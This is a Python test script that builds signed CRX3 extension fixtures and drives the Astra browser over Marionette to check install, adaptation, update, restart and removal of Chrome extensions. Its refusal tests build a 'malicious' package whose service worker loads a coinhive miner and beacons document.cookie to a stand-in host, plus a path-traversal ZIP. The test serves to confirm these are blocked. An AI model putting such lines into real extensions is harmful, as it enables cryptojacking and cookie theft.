#!/usr/bin/env python3
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.
"""Chrome extension intake probe: real CRX3 in, running extension out.

Builds signed CRX3 fixtures with a throwaway RSA key, then drives the packaged
Astra dev build over Marionette:

  inspect -> CRX3 signature verified, Chrome id derived from the key
  install -> AddonManager temporary add-on (this build requires signatures)
  run     -> background executes, MV3 callback shim works, content script
             runs, runtime messaging answers, storage is readable
  adapt   -> service worker became an event page, side_panel became
             sidebar_action, importScripts was expanded, sidePanel permission
             was removed
  update  -> same key, new version, engine reports the new version
  restart -> the package is restored from Astra's record and runs again
  remove  -> uninstall, record and package directory are gone
  refuse  -> blocked package, tampered CRX and traversal ZIP never install

Run headed on a private compositor:
  tools/perf/hidden-display.sh python3 tools/perf/stress/chrome_ext_probe.py out/chrome-ext

Exit 0 PASS, 1 FAIL, 2 SKIP when the binary or python ``cryptography`` is
missing. Stdlib + cryptography only.
"""
import http.server
import io
import json
import os
import shutil
import signal
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
import zipfile

try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding, rsa
except ImportError:  # pragma: no cover - environment skip
    print("SKIP: python cryptography is not installed", file=sys.stderr)
    sys.exit(2)

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
ENGINE = os.environ.get("ASTRA_ENGINE", os.path.join(ROOT, "engine", "obj-astra-linux"))
BIN = os.environ.get("ASTRA_BINARY", os.path.join(ENGINE, "dist", "bin", "firefox"))
MPORT = int(os.environ.get("ASTRA_CHROME_EXT_MARIONETTE", "2917"))
OUT = os.path.abspath(sys.argv[1]) if len(sys.argv) > 1 else os.path.join(ROOT, "out", "chrome-ext-probe")
PAGE_TITLE = "Chrome Extension Probe Site"

sys.path.insert(0, os.path.join(ROOT, "tests", "contract"))
import load_state as L  # noqa: E402

if not os.path.isfile(BIN):
    print(f"SKIP: no built browser at {BIN}", file=sys.stderr)
    sys.exit(2)


class Site(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = (
            f"<!doctype html><html><head><title>{PAGE_TITLE}</title></head>"
            "<body><h1 id='probe'>chrome extension probe</h1></body></html>"
        ).encode()
        self.send_response(200)
        self.send_header("content-type", "text/html; charset=utf-8")
        self.send_header("content-length", str(len(body)))
        self.send_header("cache-control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_args):
        pass


def serve():
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Site)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, server.server_address[1]


# --- CRX3 fixtures --------------------------------------------------------

KEY = rsa.generate_private_key(public_exponent=65537, key_size=2048)
SPKI = KEY.public_key().public_bytes(
    serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
)


def _varint(value):
    out = b""
    while True:
        byte = value & 0x7F
        value >>= 7
        out += bytes([byte | 0x80]) if value else bytes([byte])
        if not value:
            return out


def _field(number, wire, body):
    return _varint((number << 3) | wire) + body


def extension_id(spki=SPKI):
    import hashlib

    digest = hashlib.sha256(spki).digest()[:16]
    return "".join(chr(ord("a") + (b >> 4)) + chr(ord("a") + (b & 0x0F)) for b in digest)


def make_crx(manifest, files, version_suffix="", key=KEY, spki=SPKI):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("manifest.json", json.dumps(manifest, indent=2))
        for name, data in files.items():
            archive.writestr(name, data)
    payload = buf.getvalue()
    crx_id = __import__("hashlib").sha256(spki).digest()[:16]
    signed_data = b"\x0a" + bytes([len(crx_id)]) + crx_id
    message = b"CRX3 SignedData\x00" + struct.pack("<I", len(signed_data)) + signed_data + payload
    signature = key.sign(message, padding.PKCS1v15(), hashes.SHA256())
    proof = _field(1, 2, _varint(len(spki)) + spki) + _field(2, 2, _varint(len(signature)) + signature)
    header = _field(2, 2, _varint(len(proof)) + proof)
    header += _field(10000, 2, _varint(len(signed_data)) + signed_data)
    return b"Cr24" + struct.pack("<I", 3) + struct.pack("<I", len(header)) + header + payload + version_suffix.encode()


def manifest_for(version):
    return {
        "manifest_version": 3,
        "name": "Astra Chrome Probe",
        "version": version,
        "description": "A live CRX3 fixture for Astra's Chrome intake.",
        "action": {"default_title": "Astra Probe"},
        "background": {"service_worker": "sw.js", "type": "classic"},
        "content_scripts": [
            {"matches": ["<all_urls>"], "js": ["cs.js"], "run_at": "document_idle"}
        ],
        "permissions": ["storage", "scripting", "sidePanel"],
        "host_permissions": ["<all_urls>"],
        "side_panel": {"default_path": "panel.html", "default_title": "Astra Panel"},
        "key": __import__("base64").b64encode(SPKI).decode(),
    }


LIB_JS = "function astraProbeValue() { return 'ok'; }\n"


def worker_js(version):
    return f"""// Chrome MV3 service worker fixture.
importScripts('lib.js');
const PROBE_VERSION = '{version}';
chrome.runtime.onInstalled.addListener(() => {{
  chrome.storage.local.set({{ astra_probe_installed: true, astra_probe_version: PROBE_VERSION }}, () => {{}});
}});
chrome.storage.local.set({{ astra_probe_booted: true, astra_probe_version: PROBE_VERSION, astra_probe_lib: astraProbeValue() }});
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {{
  if (message && message.kind === 'ping') {{
    sendResponse({{ kind: 'pong', value: 'pong-' + PROBE_VERSION }});
    return true;
  }}
  return false;
}});
"""


CONTENT_JS = """(() => {
  const done = () => {
    chrome.storage.local.get(['astra_probe_booted', 'astra_probe_version'], (value) => {
      chrome.runtime.sendMessage({ kind: 'ping' }, (reply) => {
        const booted = value && value.astra_probe_booted === true ? '1' : '0';
        const version = (value && value.astra_probe_version) || 'none';
        const pong = reply && reply.kind === 'pong' ? reply.value : 'no-pong';
        document.title = 'ASTRA-PROBE:' + booted + ':' + pong + ':' + version;
      });
    });
  };
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', done);
  else done();
})();
"""

SIDE_PANEL = "<!doctype html><title>Astra panel</title><p>panel</p>"


def write_fixtures(directory):
    v1 = make_crx(manifest_for("1.0.0"), {"sw.js": worker_js("1.0.0"), "lib.js": LIB_JS, "cs.js": CONTENT_JS, "panel.html": SIDE_PANEL})
    v2 = make_crx(manifest_for("1.1.0"), {"sw.js": worker_js("1.1.0"), "lib.js": LIB_JS, "cs.js": CONTENT_JS, "panel.html": SIDE_PANEL})
    paths = {
        "v1": os.path.join(directory, "probe-v1.crx"),
        "v2": os.path.join(directory, "probe-v2.crx"),
        "tampered": os.path.join(directory, "tampered.crx"),
        "malicious": os.path.join(directory, "malicious.zip"),
        "traversal": os.path.join(directory, "traversal.zip"),
    }
    open(paths["v1"], "wb").write(v1)
    open(paths["v2"], "wb").write(v2)
    tampered = bytearray(v1)
    tampered[-1] ^= 0xFF
    open(paths["tampered"], "wb").write(bytes(tampered))
    with zipfile.ZipFile(paths["malicious"], "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(
            "manifest.json",
            json.dumps(
                {
                    "manifest_version": 3,
                    "name": "Blocked Probe",
                    "version": "1.0.0",
                    "background": {"service_worker": "sw.js"},
                    "permissions": ["storage"],
                }
            ),
        )
        archive.writestr(
            "sw.js",
            "importScripts('https://coinhive.com/lib/miner.js');\n"
            "navigator.sendBeacon('https://collect.test', document.cookie);\n",
        )
    with zipfile.ZipFile(paths["traversal"], "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("manifest.json", json.dumps({"manifest_version": 3, "name": "Escape", "version": "1.0.0"}))
        archive.writestr("../escape.js", "console.log('escape');")
    return paths, extension_id()


RUN = r"""
const done = arguments[arguments.length - 1];
(async () => {
  const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const out = { steps: [], metrics: {} };
  const step = (name, ok, detail) => out.steps.push({ name, ok: ok === true, detail: detail ?? null });
  const metrics = out.metrics;
  const t = (label, start) => { metrics[label] = Math.round((performance.now() - start) * 10) / 10; };
  try {
    let host = null;
    for (let i = 0; i < 120; i += 1) {
      host = Services.astraHost;
      if (host?.WebExtensions && host?.ChromeExtensions && host?.Tabs) break;
      await wait(250);
    }
    if (!host?.WebExtensions || !host?.ChromeExtensions) {
      done(JSON.stringify({ ...out, error: "no Host API / ChromeExtensions" }));
      return;
    }
    const { AddonManager } = ChromeUtils.importESModule("resource://gre/modules/AddonManager.sys.mjs");
    await AddonManager.readyPromise;
    const id = "__ID__";
    const page = "__PAGE__";

    // 1. the Rust core answers with the engine profile -------------------
    const caps = await host.Boot.coreCall({ request_id: "ext-caps", name: "extensions.capabilities", payload: {} });
    step("the Rust core answers", !caps?.error && caps?.payload?.engine === "153.6.0esr", caps?.payload ?? caps?.error);
    step("the core reports service workers disabled", caps?.payload?.service_workers === false);
    step("the core reports CRX3 intake", Array.isArray(caps?.payload?.crx) && caps.payload.crx.includes("crx3"));

    // 2. inspect ---------------------------------------------------------
    let inspectStart = performance.now();
    const review = await host.WebExtensions.prepareFile({ path: "__V1__" });
    t("inspect_ms", inspectStart);
    step("the review is Chrome-sourced", review.source === "chrome", review.source);
    step("the CRX3 signature verified", review.signature === "verified", review.signature);
    step("the Chrome id came from the key", review.id === id, review.id);
    step("the review states the manifest version", review.manifest_version === 3);
    step("the review states how it survives restart", review.persistence === "session" || review.persistence === "profile", review.persistence);
    step("the review lists a limitation", review.limitations.length > 0, review.limitations);
    step("the review names the adapted background", review.compatibility === "adapted" || review.compatibility === "limited", review.compatibility);
    step("the review warns about site access", review.warnings.some((w) => w.includes("all your data on all websites")), review.warnings);

    // 3. confirm / install ----------------------------------------------
    inspectStart = performance.now();
    await host.WebExtensions.confirm({ id: review.id, reviewId: review.review_id });
    t("install_ms", inspectStart);
    let addon = null;
    for (let i = 0; i < 120; i += 1) {
      addon = await AddonManager.getAddonByID(id);
      if (addon) break;
      await wait(250);
    }
    step("the engine registered the extension", addon !== null && addon.id === id);
    step("the engine reports the version", addon?.version === "1.0.0", addon?.version);
    step("the engine reports it active", addon?.isActive === true && addon?.userDisabled !== true);
    const record = await host.ChromeExtensions.record({ id });
    let adapted = null;
    try {
      const IO = globalThis.IOUtils ?? ChromeUtils.importESModule("resource://gre/modules/IOUtils.sys.mjs").IOUtils;
      const report = await IO.readJSON(record.work_dir + "/report.json");
      adapted = report?.adapted_manifest ?? null;
    } catch (e) {
      out.reportError = String(e);
    }
    step("the staged manifest is readable", adapted !== null);
    step("the engine sees no side_panel", adapted !== null && !adapted.side_panel);
    step("the engine sees the adapted sidebar", adapted?.sidebar_action?.default_panel === "panel.html", adapted?.sidebar_action ?? null);
    const scripts = adapted?.background?.scripts ?? [];
    step("the worker became an event page", scripts.includes("sw.js") && !adapted?.background?.service_worker, scripts);
    step("the compatibility prelude is first", scripts[0] === "astra-compat.js", scripts[0]);
    step("importScripts was expanded before the worker", scripts.indexOf("lib.js") >= 0 && scripts.indexOf("lib.js") < scripts.indexOf("sw.js"), scripts);
    const permissions = adapted?.permissions ?? [];
    step("storage survived", permissions.includes("storage"), permissions);
    step("the unsupported sidePanel permission was removed", !permissions.includes("sidePanel"), permissions);

    // 4. content script + background + messaging + storage ---------------
    const created = await host.Tabs.create({ request_id: "ext-page", url: page });
    step("a probe page opened", !created?.error);
    let title = "";
    for (let i = 0; i < 120; i += 1) {
      try { title = gBrowser.selectedBrowser.contentTitle ?? ""; } catch { title = ""; }
      if (title.startsWith("ASTRA-PROBE:")) break;
      await wait(250);
    }
    step("the content script ran", title.startsWith("ASTRA-PROBE:"), title);
    step("the background set storage", title.includes(":1:"), title);
    step("the MV3 callback form reached storage", title.includes("pong-1.0.0"), title);
    step("runtime messaging answered", title.includes("pong-1.0.0:"), title);
    step("the content script sees 1.0.0", title.endsWith(":1.0.0"), title);

    // 5. disable / enable ------------------------------------------------
    await host.WebExtensions.setEnabled({ id, enabled: false });
    await wait(800);
    gBrowser.reload();
    await wait(1200);
    let offTitle = "";
    for (let i = 0; i < 40; i += 1) {
      try { offTitle = gBrowser.selectedBrowser.contentTitle ?? ""; } catch { offTitle = ""; }
      if (!offTitle.startsWith("ASTRA-PROBE:")) break;
      await wait(250);
    }
    step("disable stops the content script", !offTitle.startsWith("ASTRA-PROBE:"), offTitle);
    await host.WebExtensions.setEnabled({ id, enabled: true });
    await wait(800);
    gBrowser.reload();
    let onTitle = "";
    for (let i = 0; i < 80; i += 1) {
      try { onTitle = gBrowser.selectedBrowser.contentTitle ?? ""; } catch { onTitle = ""; }
      if (onTitle.startsWith("ASTRA-PROBE:")) break;
      await wait(250);
    }
    step("enable starts it again", onTitle.startsWith("ASTRA-PROBE:"), onTitle);

    // 6. update ----------------------------------------------------------
    const update = await host.WebExtensions.prepareFile({ path: "__V2__" });
    step("an update review keeps the same id", update.id === id, update.id);
    await host.WebExtensions.confirm({ id: update.id, reviewId: update.review_id });
    let updated = null;
    for (let i = 0; i < 120; i += 1) {
      updated = await AddonManager.getAddonByID(id);
      if (updated?.version === "1.1.0") break;
      await wait(250);
    }
    step("the update reached 1.1.0", updated?.version === "1.1.0", updated?.version);
    gBrowser.reload();
    let v2Title = "";
    for (let i = 0; i < 80; i += 1) {
      try { v2Title = gBrowser.selectedBrowser.contentTitle ?? ""; } catch { v2Title = ""; }
      if (v2Title.endsWith(":1.1.0")) break;
      await wait(250);
    }
    step("the updated background runs", v2Title.startsWith("ASTRA-PROBE:") && v2Title.endsWith(":1.1.0"), v2Title);

    // 7. refusals --------------------------------------------------------
    let blocked = null;
    try { blocked = await host.WebExtensions.prepareFile({ path: "__MAL__" }); } catch (e) { out.maliciousError = String(e); }
    step("a malicious package is reviewed as blocked", blocked?.security?.blocked === true, blocked?.security);
    let blockedInstall = null;
    if (blocked) {
      try { await host.WebExtensions.confirm({ id: blocked.id, reviewId: blocked.review_id }); } catch (e) { blockedInstall = String(e); }
    }
    step("a blocked package never installs", blockedInstall !== null && blockedInstall.includes("refused"), blockedInstall);
    let tampered = null;
    try { await host.WebExtensions.prepareFile({ path: "__TAMPERED__" }); } catch (e) { tampered = String(e); }
    step("a tampered CRX signature is refused", tampered !== null, tampered);
    let traversal = null;
    try { await host.WebExtensions.prepareFile({ path: "__TRAVERSAL__" }); } catch (e) { traversal = String(e); }
    step("a traversal ZIP is refused", traversal !== null, traversal);

    // 8. record and package directory ------------------------------------
    const finalRecord = await host.ChromeExtensions.record({ id });
    step("the install record is present", finalRecord !== null && finalRecord.xpi_sha256?.length === 64, finalRecord);
    step("the record names the source", finalRecord?.source === "chrome");
    out.record = finalRecord;

    const probe = await AddonManager.getAddonByID(id);
    out.addonId = id;
    out.version = probe?.version ?? null;
    out.persistence = review.persistence;
  } catch (error) {
    out.error = String(error?.stack ?? error);
  }
  done(JSON.stringify(out));
})()
"""

VERIFY_AFTER_RESTART = r"""
const done = arguments[arguments.length - 1];
(async () => {
  const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const out = { steps: [] };
  const step = (name, ok, detail) => out.steps.push({ name, ok: ok === true, detail: detail ?? null });
  try {
    let host = null;
    for (let i = 0; i < 160; i += 1) {
      host = Services.astraHost;
      if (host?.WebExtensions && host?.ChromeExtensions) break;
      await wait(250);
    }
    const { AddonManager } = ChromeUtils.importESModule("resource://gre/modules/AddonManager.sys.mjs");
    await AddonManager.readyPromise;
    const id = "__ID__";
    let addon = null;
    for (let i = 0; i < 160; i += 1) {
      addon = await AddonManager.getAddonByID(id);
      if (addon) break;
      await wait(250);
    }
    step("the session package was restored", addon !== null, addon?.version ?? null);
    step("the restored version is 1.1.0", addon?.version === "1.1.0", addon?.version);
    const record = await host.ChromeExtensions.record({ id });
    step("the record survived the restart", record !== null, record?.persistence ?? null);
    const created = await host.Tabs.create({ request_id: "ext-page-2", url: "__PAGE__" });
    step("a page opened after restart", !created?.error);
    let title = "";
    for (let i = 0; i < 120; i += 1) {
      try { title = gBrowser.selectedBrowser.contentTitle ?? ""; } catch { title = ""; }
      if (title.startsWith("ASTRA-PROBE:")) break;
      await wait(250);
    }
    step("the restored extension runs", title.startsWith("ASTRA-PROBE:") && title.endsWith(":1.1.0"), title);
    step("the restored background set storage", title.includes(":1:"), title);

    // remove ------------------------------------------------------------
    await host.WebExtensions.uninstall({ id });
    let gone = null;
    for (let i = 0; i < 120; i += 1) {
      gone = await AddonManager.getAddonByID(id);
      if (!gone) break;
      await wait(250);
    }
    step("uninstall removes the add-on", gone === null);
    const after = await host.ChromeExtensions.record({ id });
    step("uninstall removes the record", after === null);
    await host.ChromeExtensions.restore();
    step("restore does not bring it back", (await AddonManager.getAddonByID(id)) === null);
    let packageGone = false;
    try {
      const io = IOUtils;
      const info = await io.stat("__ROOT__/packages/" + id);
      packageGone = !info;
    } catch {
      packageGone = true;
    }
    step("uninstall removes the package directory", packageGone);
    done(JSON.stringify(out));
  } catch (error) {
    done(JSON.stringify({ ...out, error: String(error?.stack ?? error) }));
  }
})()
"""


def launch(profile):
    log = open(os.path.join(profile, "browser.log"), "ab")
    proc = subprocess.Popen(
        [BIN, "-profile", profile, "-no-remote", "-remote-allow-system-access", "--marionette", "about:blank"],
        cwd=os.path.dirname(BIN),
        stdout=log,
        stderr=subprocess.STDOUT,
        start_new_session=True,
    )
    return proc, log


def connect():
    m = L.Marionette(MPORT, timeout=120)
    m.sock.settimeout(300)
    m.cmd("WebDriver:NewSession", {"capabilities": {}})
    m.cmd("WebDriver:SetTimeouts", {"script": 300000, "implicit": 0, "pageLoad": 120000})
    m.cmd("Marionette:SetContext", {"value": "chrome"})
    return m


def stop(proc, log):
    try:
        os.killpg(proc.pid, signal.SIGTERM)
        proc.wait(timeout=20)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass
    log.close()


def main():
    os.makedirs(OUT, exist_ok=True)
    profile = tempfile.mkdtemp(prefix="astra-chrome-ext-")
    fixtures, chrome_id = write_fixtures(profile)
    install_id = f"{chrome_id}@chrome.astra"
    server, port = serve()
    page = f"http://127.0.0.1:{port}/probe"
    with open(os.path.join(profile, "user.js"), "w") as fh:
        fh.write(f'user_pref("marionette.port", {MPORT});\n')
        fh.write('user_pref("browser.shell.checkDefaultBrowser", false);\n')
        fh.write('user_pref("browser.startup.page", 0);\n')
        fh.write('user_pref("browser.startup.homepage", "about:blank");\n')
        fh.write('user_pref("extensions.webextensions.remote", true);\n')
        # No xpinstall.signatures.required=false: this exercises the real
        # (signed-build) path: temporary add-on + Astra restore.
    result = {"profile": profile, "chrome_id": chrome_id, "fixtures": fixtures}
    first = None
    second = None
    log = None
    proc = None
    try:
        proc, log = launch(profile)
        m = connect()
        script = (
            RUN.replace("__ID__", install_id)
            .replace("__V1__", fixtures["v1"])
            .replace("__V2__", fixtures["v2"])
            .replace("__MAL__", fixtures["malicious"])
            .replace("__TAMPERED__", fixtures["tampered"])
            .replace("__TRAVERSAL__", fixtures["traversal"])
            .replace("__PAGE__", page)
        )
        first = json.loads(m.execute_async(script))
        result["first"] = first
        # Quit cleanly so the profile writes the record.
        try:
            m.execute("Services.startup.quit(Ci.nsIAppStartup.eAttemptQuit); return true;")
        except Exception:
            pass
        stop(proc, log)
        proc = None
        m = None
        time.sleep(2)
        proc, log = launch(profile)
        m = connect()
        root = os.path.join(profile, "astra", "extensions", "chrome")
        second = json.loads(
            m.execute_async(
                VERIFY_AFTER_RESTART.replace("__ID__", install_id)
                .replace("__PAGE__", page)
                .replace("__ROOT__", root)
            )
        )
        result["second"] = second
        try:
            m.execute("Services.startup.quit(Ci.nsIAppStartup.eAttemptQuit); return true;")
        except Exception:
            pass
        stop(proc, log)
        proc = None
    finally:
        server.shutdown()
        if proc is not None:
            stop(proc, log)
        steps = (first or {}).get("steps", []) + (second or {}).get("steps", [])
        ok = bool(steps) and all(item["ok"] for item in steps) and not first.get("error") and not second.get("error")
        result["pass"] = ok
        with open(os.path.join(OUT, "result.json"), "w") as fh:
            json.dump(result, fh, indent=2)
        failed = [item["name"] for item in steps if not item["ok"]]
        print(json.dumps({"pass": ok, "steps": len(steps), "failed": failed, "metrics": (first or {}).get("metrics", {})}, indent=2))
        if not ok:
            try:
                log_path = os.path.join(profile, "browser.log")
                if os.path.isfile(log_path):
                    shutil.copy(log_path, os.path.join(OUT, "browser.log"))
            except Exception:
                pass
            print(json.dumps(result, indent=2)[:12000], file=sys.stderr)
            print(f"profile kept: {profile}", file=sys.stderr)
        else:
            shutil.rmtree(profile, ignore_errors=True)
    return 0 if result.get("pass") else 1


if __name__ == "__main__":
    sys.exit(main())
